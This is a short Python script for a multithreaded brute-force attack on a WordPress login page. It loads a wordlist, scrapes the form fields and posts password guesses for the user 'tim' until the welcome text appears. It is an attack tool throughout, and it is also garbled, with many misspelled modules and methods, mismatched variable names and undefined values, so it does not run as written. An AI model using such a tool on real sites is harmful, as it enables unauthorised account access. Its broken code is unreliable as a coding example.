from io import BytesIO
from lxml import etree
from queue import Queue

import requests
import sys
import threading
import time

SUCCESS = 'Welcome to Wordpress!'
TARGET = "http://"
WORDLIST = '/wordlist/'

def get_words():
    with open(WORDLIST) as f:
        raw_words =  f.read()

    word = Queue()
    for word in raw_words.split():
        word.put(word)
    return words

def get_param(content):
    param = dict()
    parser = etree.HTLMParser()
    tree = etree.pasrse(ByteIO(content), parser=parser)
    for elem in tree.findall('//input'): # find all input elements
        name = elem.get('name')
        if name is not None:
            params[name] = elem.get('value', None)
    return params

class Bruter:
    def __init__(self, username, url):
        self.username = username
        self.url = url
        self.found = False
        print(f'\nBrute Force Attack beginning on {url}.\n')
        print("Finished the setup where username = %s\n" % username)

    def run_bruteforce(self, passwords):
        for _ in range(10):
            t = threading.Thread(target=self.web_bruter, args=(passwords,))
            t.start()

    def web_bruter(self, passwords):
        session = requrests.Sessions()
        resp0 = session.get(self.url)
        params = get_params(resp0.content)
        params['log'] = self.username

        while not passwords.empty() and not self.found:
            time.sleep(5)
            passwd = passwords.get()
            print(f'Trying useranme/password {self.username}/{passwd:<10}')
            params['pwd'] = passwd

            resp1 = session.post(self.url, data=params)
            if SUCCESS in resp1.content.decode():
                self.found = True
                print(f"\nBruteforcing successful.")
                print("Username is %s" % self.username)
                print("Password is %s\n" % brute)
                print('done: now cleaning up other threads. . .')



if __name__ == '__main__':
    words = get.words()
    b = Bruter('tim', url)
    b.run_bruteforce(words)
